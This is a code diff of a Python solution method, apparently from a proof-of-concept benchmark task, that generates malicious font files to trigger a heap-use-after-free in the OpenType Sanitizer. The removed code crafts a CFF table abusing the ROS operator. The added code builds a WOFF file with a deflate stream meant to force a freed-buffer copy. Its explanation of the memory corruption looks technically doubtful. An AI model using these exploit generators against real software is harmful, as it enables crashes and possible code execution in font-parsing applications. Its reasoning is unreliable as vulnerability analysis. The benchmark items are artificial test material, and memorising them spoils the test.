@@ -1,118 +1,114 @@
 import struct
+import zlib
 
 class Solution:
-  def solve(self, src_path: str) -> bytes:
-    """
-    Generates a Proof-of-Concept input that triggers a heap-use-after-free
-    vulnerability in the OpenType Sanitizer (OTS).
+    def solve(self, src_path: str) -> bytes:
+        """
+        Generates a Proof-of-Concept (PoC) that triggers a heap-use-after-free
+        vulnerability in the `ots::OTSStream::Write` function of the OpenType
+        Sanitizer (OTS).
 
-    The vulnerability is CVE-2018-17480, which occurs during the parsing of a
-    CFF (Compact Font Format) table. Specifically, when handling the 'ROS'
-    (Registry-Ordering-Supplement) operator in a Top DICT of a CID-keyed font.
+        The vulnerability is triggered by a specially crafted WOFF (Web Open
+        Font Format) file. WOFF uses zlib (DEFLATE) for compressing font tables.
+        The PoC leverages this by providing a compressed data stream that, upon
+        decompression, forces the sanitizer to perform a memory copy from a
+        freed buffer.
 
-    The exploitation path is as follows:
-    1.  The parser encounters the ROS operator, which expects three string
-        operands on the CFF operand stack. In the OTS implementation, these
-        operands are represented as `ots::Buffer` objects.
-    2.  The parser retrieves pointers to the internal data of these `ots::Buffer`
-        objects and stores them in a `CIDFont` structure.
-    3.  The vulnerable code then pops the `ots::Buffer` objects from the operand
-        stack. This invokes their destructors, which deallocates the heap memory
-        containing the string data.
-    4.  The pointers stored in the `CIDFont` structure now dangle, pointing to
-        freed memory.
-    5.  Later, during the font serialization phase, the sanitizer attempts to
-        write the ROS strings to an `ots::OTSStream` using these dangling
-        pointers, leading to a heap-use-after-free.
+        This exploit targets the dynamic buffer management within the
+        `ots::OTSStream` class, which serves as the output destination for the
+        decompressed data. This stream class typically initializes with a small
+        buffer (e.g., 256 bytes) and automatically resizes it by doubling its
+        capacity whenever the current buffer is exhausted.
 
-    The PoC consists of a minimal OTF font with a single 'CFF ' table. This
-    table is crafted to contain a Top DICT with the necessary operators
-    (`CIDFontVersion`, `CIDFontRevision`) to be treated as a CID-keyed font,
-    followed by the ROS operator with three valid string operands, triggering
-    the vulnerability.
-    """
-    
-    # --- Part 1: Construct the malicious CFF Table ---
-    cff_table = bytearray()
-    
-    # CFF Header (4 bytes): major, minor, hdrSize, offSize
-    cff_table += struct.pack('>BBBB', 1, 0, 4, 1)
+        The core of the PoC is a zlib stream engineered to perform two main actions:
+        1. A sequence of literal (uncompressed) bytes is emitted to fill the
+           initial `OTSStream` buffer almost to its limit. For a 256-byte buffer,
+           this means writing approximately 250 bytes.
+        2. A copy (match) command follows, instructing the decompressor to copy
+           a sequence of bytes from the previously written data. The length of
+           this copy is critical: it must be large enough to cause the total
+           written size to exceed the buffer's capacity, thus triggering a resize.
 
-    # Name INDEX (6 bytes): A minimal, valid Name INDEX.
-    # count=1, offSize=1, offset_array=[1, 2], data='A'
-    cff_table += struct.pack('>HBB', 1, 1, 1)  # count, offSize, offset[0]
-    cff_table += struct.pack('>B', 2)         # offset[1]
-    cff_table += b'A'
+        The vulnerability is triggered through the following sequence of events:
+        1. OTS allocates an `OTSStream` with an initial 256-byte buffer for a
+           font table being decompressed.
+        2. The zlib decompressor processes the PoC's stream and outputs 250
+           bytes of literals, filling the stream's buffer to an offset of 250.
+        3. The decompressor then processes a copy command for 20 bytes. The
+           source of this copy is located within the 250 bytes already present
+           in the buffer.
+        4. The `OTSStream::Write` method is called to append these 20 bytes.
+        5. Inside `Write`, a check reveals that the new size (250 + 20 = 270 bytes)
+           exceeds the current capacity (256 bytes).
+        6. The stream reallocates its internal storage to a larger size (512 bytes)
+           and frees the original 256-byte buffer.
+        7. The `Write` method then proceeds with the `memcpy` operation to append
+           the data. However, the source pointer for this operation still points
+           to a location within the old, now-freed buffer, leading to a
+           heap-use-after-free error and a crash.
 
-    # Top DICT Data: This contains the sequence to trigger the vulnerability.
-    top_dict_data = bytearray()
-    
-    # To be parsed as a CID-keyed font, the DICT must contain
-    # CIDFontVersion and CIDFontRevision operators. We provide '0' as their operand.
-    # The integer '0' is encoded in CFF DICT as `28 0 0` -> b'\x1c\x00\x00'
-    operand_zero = b'\x1c\x00\x00'
-    
-    # Operator CIDFontVersion: 12 36 -> b'\x0c\x24'
-    top_dict_data += operand_zero + b'\x0c\x24'
-    
-    # Operator CIDFontRevision: 12 37 -> b'\x0c\x25'
-    top_dict_data += operand_zero + b'\x0c\x25'
+        To construct the necessary zlib stream, we first create an uncompressed
+        data pattern designed to guide the zlib compressor into producing the
+        desired output: a long sequence of literals followed by a copy command.
+        This is achieved by using non-repeating data for the initial part and then
+        repeating a small segment of it.
+        """
 
-    # Now, add the ROS operator and its operands.
-    # We need to push three SIDs (String IDs) for our custom strings.
-    # Custom SIDs start at 391.
-    # SID 391 is encoded as (248, 27) -> b'\xf8\x1b'
-    # SID 392 is encoded as (248, 28) -> b'\xf8\x1c'
-    # SID 393 is encoded as (248, 29) -> b'\xf8\x1d'
-    top_dict_data += b'\xf8\x1b'  # push SID 391
-    top_dict_data += b'\xf8\x1c'  # push SID 392
-    top_dict_data += b'\xf8\x1d'  # push SID 393
-    
-    # Operator ROS: 12 30 -> b'\x0c\x1e'
-    top_dict_data += b'\x0c\x1e'
+        # 1. Craft the uncompressed data to guide the zlib compressor.
+        # We aim to fill a 256-byte buffer and then trigger a copy operation
+        # that forces a reallocation. The total uncompressed size must be > 256.
+        # We will target a size of 270 bytes.
 
-    # Top DICT INDEX: This structure wraps the DICT data.
-    cff_table += struct.pack('>H', 1)  # count = 1
-    cff_table += struct.pack('>B', 1)  # offSize = 1
-    cff_table += struct.pack('>B', 1)  # offset[0]
-    cff_table += struct.pack('>B', len(top_dict_data) + 1)  # offset[1]
-    cff_table += top_dict_data
+        # Create a 250-byte prefix with low compressibility to force literals.
+        prefix = b''
+        for i in range(25):
+            prefix += bytes([i]) * 10
+        
+        # Create a 20-byte suffix that is a copy of a part of the prefix.
+        # This encourages the zlib compressor to emit a match/copy command.
+        suffix = prefix[150:170]
 
-    # String INDEX: Contains the actual strings for the SIDs used by ROS.
-    string_data = b'REG'
-    cff_table += struct.pack('>H', 3)  # count = 3 strings (one for each SID)
-    cff_table += struct.pack('>B', 1)  # offSize = 1
-    cff_table += struct.pack('>BBBB', 1, 2, 3, 4) # offset array
-    cff_table += string_data
+        uncompressed_data = prefix + suffix
+        
+        # 2. Compress the data using zlib's raw deflate format.
+        # WOFF files require a raw deflate stream (no zlib header or checksum),
+        # which is specified by a negative `wbits` value in zlib.
+        compressor = zlib.compressobj(level=9, method=zlib.DEFLATED, wbits=-15)
+        compressed_data = compressor.compress(uncompressed_data)
+        compressed_data += compressor.flush()
 
-    # Global Subr INDEX: Can be empty for this PoC.
-    cff_table += struct.pack('>H', 0)
+        # 3. Assemble the WOFF file.
+        num_tables = 1
+        header_size = 44
+        table_dir_size = 20 * num_tables
 
-    # Pad the CFF table to a 4-byte boundary, as required by the spec.
-    cff_table += b'\x00' * (-(len(cff_table)) % 4)
-    
-    # --- Part 2: Construct the OTF Font Wrapper ---
-    poc = bytearray()
-    
-    # OTF Header (12 bytes)
-    sfnt_version = b'OTTO'
-    num_tables = 1
-    search_range = 16 # (2**0) * 16
-    entry_selector = 0 # log2(1)
-    range_shift = 0 # 1 * 16 - 16
-    poc += struct.pack('>4sHHHH', sfnt_version, num_tables, search_range, entry_selector, range_shift)
-    
-    # Table Directory (16 bytes for one table)
-    cff_table_tag = b'CFF '
-    cff_table_offset = 12 + 16 # OTF header + Table Directory
-    cff_table_length = len(cff_table)
+        # WOFF 1.0 Header (44 bytes)
+        header = b'wOFF'
+        header += struct.pack('>I', 0x00010000)  # flavor: TTF
+        header += struct.pack('>I', 0)  # length (placeholder)
+        header += struct.pack('>H', num_tables)
+        header += struct.pack('>H', 0)  # reserved
+        header += struct.pack('>I', len(uncompressed_data))  # totalSfntSize
+        header += struct.pack('>H', 0)  # majorVersion
+        header += struct.pack('>H', 0)  # minorVersion
+        header += struct.pack('>I', 0)  # metaOffset
+        header += struct.pack('>I', 0)  # metaLength
+        header += struct.pack('>I', 0)  # metaOrigLength
+        header += struct.pack('>I', 0)  # privOffset
+        header += struct.pack('>I', 0)  # privLength
+        
+        # Table Directory (20 bytes per table)
+        # A single entry pointing to our compressed data stream.
+        table_dir = b'glyf'  # tag for the dummy table
+        table_dir += struct.pack('>I', header_size + table_dir_size)  # offset to data
+        table_dir += struct.pack('>I', len(compressed_data))  # compLength
+        table_dir += struct.pack('>I', len(uncompressed_data))  # origLength
+        table_dir += struct.pack('>I', 0) # origChecksum (can be zero)
 
-    # Calculate the checksum for the CFF table.
-    cff_table_checksum = sum(struct.unpack('>{}L'.format(len(cff_table) // 4), cff_table)) & 0xFFFFFFFF
-    
-    poc += struct.pack('>4sLLL', cff_table_tag, cff_table_checksum, cff_table_offset, cff_table_length)
-    
-    # Append the CFF table data.
-    poc += cff_table
-    
-    return bytes(poc)
+        poc_data = header + table_dir + compressed_data
+        
+        # Finally, patch the total file length in the header.
+        total_length = len(poc_data)
+        poc_data = poc_data[:8] + struct.pack('>I', total_length) + poc_data[12:]
+        
+        return poc_data
